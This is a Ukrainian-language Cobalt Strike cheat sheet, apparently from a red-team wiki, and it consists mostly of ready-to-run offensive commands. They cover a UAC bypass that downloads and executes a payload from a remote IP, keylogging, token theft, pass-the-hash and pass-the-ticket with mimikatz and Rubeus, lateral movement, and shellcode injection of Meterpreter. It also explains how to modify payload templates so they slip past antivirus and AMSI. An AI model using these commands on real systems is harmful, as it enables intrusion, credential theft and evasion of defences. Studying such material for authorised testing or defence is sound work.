# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`, потім ви можете вибрати, де слухати, який тип маяка використовувати (http, dns, smb...) та інше.

### Peer2Peer Listeners

Маяки цих слухачів не повинні спілкуватися з C2 безпосередньо, вони можуть спілкуватися з ним через інші маяки.

`Cobalt Strike -> Listeners -> Add/Edit`, потім вам потрібно вибрати TCP або SMB маяки.

* **TCP маяк встановить слухача на вибраному порту**. Щоб підключитися до TCP маяка, використовуйте команду `connect <ip> <port>` з іншого маяка.
* **smb маяк буде слухати в pipename з вибраною назвою**. Щоб підключитися до SMB маяка, вам потрібно використовувати команду `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** для HTA файлів
* **`MS Office Macro`** для офісного документа з макросом
* **`Windows Executable`** для .exe, .dll або служби .exe
* **`Windows Executable (S)`** для **stageless** .exe, .dll або служби .exe (краще stageless, ніж staged, менше IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Це згенерує скрипт/виконуваний файл для завантаження маяка з cobalt strike у форматах, таких як: bitsadmin, exe, powershell та python.

#### Host Payloads

Якщо у вас вже є файл, який ви хочете розмістити на веб-сервері, просто перейдіть до `Attacks -> Web Drive-by -> Host File` і виберіть файл для розміщення та конфігурацію веб-сервера.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Виконати локальний .NET бінарний файл
execute-assembly &#x3C;/path/to/executable.exe>

# Скриншоти
printscreen    # Зробити один скриншот за допомогою методу PrintScr
screenshot     # Зробити один скриншот
screenwatch    # Зробити періодичні скриншоти робочого столу
## Перейдіть до View -> Screenshots, щоб їх побачити

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes, щоб побачити натиснуті клавіші

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Впровадити дію сканування портів у інший процес
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Імпортувати модуль Powershell
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;просто напишіть команду powershell тут>

# Імітація користувача
## Генерація токена з обліковими даними
make_token [DOMAIN\user] [password] #Створити токен для імітації користувача в мережі
ls \\computer_name\c$ # Спробуйте використовувати згенерований токен для доступу до C$ на комп'ютері
rev2self # Припинити використовувати токен, згенерований за допомогою make_token
## Використання make_token генерує подію 4624: Обліковий запис успішно ввійшов. Ця подія дуже поширена в домені Windows, але може бути звужена шляхом фільтрації за типом входу. Як згадувалося вище, вона використовує LOGON32_LOGON_NEW_CREDENTIALS, який є типом 9.

# UAC Bypass
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Вкрасти токен з pid
## Як make_token, але вкрасти токен з процесу
steal_token [pid] # Також це корисно для мережевих дій, а не локальних дій
## З документації API ми знаємо, що цей тип входу "дозволяє виклику клонувати свій поточний токен". Ось чому вихід Beacon говорить Impersonated &#x3C;current_username> - він імітує наш власний клонований токен.
ls \\computer_name\c$ # Спробуйте використовувати згенерований токен для доступу до C$ на комп'ютері
rev2self # Припинити використовувати токен з steal_token

## Запустити процес з новими обліковими даними
spawnas [domain\username] [password] [listener] #Зробіть це з каталогу з правами на читання, наприклад: cd C:\
## Як make_token, це згенерує подію Windows 4624: Обліковий запис успішно ввійшов, але з типом входу 2 (LOGON32_LOGON_INTERACTIVE). Це деталізує викликаючого користувача (TargetUserName) та імітованого користувача (TargetOutboundUserName).

## Впровадити в процес
inject [pid] [x64|x86] [listener]
## З точки зору OpSec: Не виконуйте крос-платформенне впровадження, якщо це дійсно не потрібно (наприклад, x86 -> x64 або x64 -> x86).

## Pass the hash
## Цей процес модифікації вимагає патчування пам'яті LSASS, що є високоризиковою дією, вимагає локальних адміністративних привілеїв і не є дуже життєздатним, якщо увімкнено Protected Process Light (PPL).
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash через mimikatz
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## Без /run, mimikatz запускає cmd.exe, якщо ви працюєте як користувач з робочим столом, він побачить оболонку (якщо ви працюєте як SYSTEM, ви в порядку)
steal_token &#x3C;pid> #Вкрасти токен з процесу, створеного mimikatz

## Pass the ticket
## Запросити квиток
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## Створити нову сесію входу для використання з новим квитком (щоб не перезаписувати скомпрометований)
make_token &#x3C;domain>\&#x3C;username> DummyPass
## Записати квиток на машину атакуючого з сеансу poweshell &#x26; завантажити його
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket з SYSTEM
## Згенерувати новий процес з квитком
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Вкрасти токен з цього процесу
steal_token &#x3C;pid>

## Extract ticket + Pass the ticket
### Список квитків
execute-assembly C:\path\Rubeus.exe triage
### Вивантажити цікавий квиток за luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### Створити нову сесію входу, зверніть увагу на luid та processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Вставити квиток у згенеровану сесію входу
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Нарешті, вкрасти токен з цього нового процесу
steal_token &#x3C;pid>

# Lateral Movement
## Якщо токен був створений, він буде використаний
jump [method] [target] [listener]
## Методи:
## psexec                    x86   Використовуйте службу для запуску артефакту Service EXE
## psexec64                  x64   Використовуйте службу для запуску артефакту Service EXE
## psexec_psh                x86   Використовуйте службу для запуску однолінійного скрипту PowerShell
## winrm                     x86   Запустіть скрипт PowerShell через WinRM
## winrm64                   x64   Запустіть скрипт PowerShell через WinRM

remote-exec [method] [target] [command]
## Методи:
<strong>## psexec                          Віддалене виконання через Менеджер контролю служб
</strong>## winrm                           Віддалене виконання через WinRM (PowerShell)
## wmi                             Віддалене виконання через WMI

## Щоб виконати маяк за допомогою wmi (це не в команді jump), просто завантажте маяк і виконайте його
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Через слухача
## На хості metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## На cobalt: Listeners > Add і встановіть Payload на Foreign HTTP. Встановіть Host на 10.10.5.120, Port на 8080 і натисніть Save.
beacon> spawn metasploit
## Ви можете запускати лише x86 Meterpreter сесії з іноземного слухача.

# Pass session to Metasploit - Через ін'єкцію shellcode
## На хості metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Запустіть msfvenom і підготуйте слухача multi/handler

## Скопіюйте бінарний файл на хост cobalt strike
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Ін'єктуйте shellcode metasploit у процес x64

# Pass metasploit session to cobalt strike
## Згенеруйте stageless Beacon shellcode, перейдіть до Attacks > Packages > Windows Executable (S), виберіть бажаний слухач, виберіть Raw як тип виходу та виберіть Use x64 payload.
## Використовуйте post/windows/manage/shellcode_inject у metasploit для ін'єкції згенерованого shellcode cobalt strike.


# Pivoting
## Відкрийте проксі-сервер socks на teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Avoiding AVs

### Artifact Kit

Зазвичай у `/opt/cobaltstrike/artifact-kit` ви можете знайти код і попередньо скомпільовані шаблони (у `/src-common`) вантажів, які cobalt strike збирається використовувати для генерації бінарних маяків.

Використовуючи [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) з згенерованим бекдором (або просто з скомпільованим шаблоном), ви можете дізнатися, що викликає спрацьовування захисника. Це зазвичай рядок. Тому ви можете просто змінити код, який генерує бекдор, так що цей рядок не з'являється в фінальному бінарному файлі.

Після зміни коду просто запустіть `./build.sh` з того ж каталогу та скопіюйте папку `dist-pipe/` на Windows-клієнт у `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Не забудьте завантажити агресивний скрипт `dist-pipe\artifact.cna`, щоб вказати Cobalt Strike використовувати ресурси з диска, які ми хочемо, а не ті, що завантажені.

### Resource Kit

Папка ResourceKit містить шаблони для скриптових корисних навантажень Cobalt Strike, включаючи PowerShell, VBA та HTA.

Використовуючи [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) з шаблонами, ви можете знайти, що не подобається захиснику (в даному випадку AMSI) і змінити це:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Модифікуючи виявлені рядки, можна створити шаблон, який не буде виявлений.

Не забудьте завантажити агресивний скрипт `ResourceKit\resources.cna`, щоб вказати Cobalt Strike використовувати ресурси з диска, які ми хочемо, а не ті, що були завантажені.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

